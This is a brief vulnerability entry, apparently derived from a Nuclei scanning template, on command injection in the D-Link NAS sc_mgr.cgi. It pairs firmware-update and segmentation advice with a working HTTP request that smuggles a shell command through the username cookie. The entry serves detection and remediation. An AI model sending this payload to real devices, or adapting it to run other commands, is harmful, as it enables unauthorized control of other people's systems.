# Vulnerability: D-Link NAS `sc_mgr.cgi` - Remote Code Execution
**Classification:** CWE-78
**Source:** Nuclei Template (`dlink-nas-rce.yaml`)

## Description
The D-Link NAS interface sc_mgr.cgi contains a command execution vulnerability that allows attackers to execute arbitrary commands on the device, potentially leading to unauthorized access or control over the system.

## Secure Mitigation
To remediate this vulnerability, ensure that the device firmware is updated to the latest version provided by the manufacturer. Additionally, consider implementing network segmentation and firewall rules to restrict unauthorized access to the device.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /cgi-bin/sc_mgr.cgi?cmd=SC_Get_Info HTTP/1.1
Host: {{Hostname}}
Cookie: username='& id &';
```

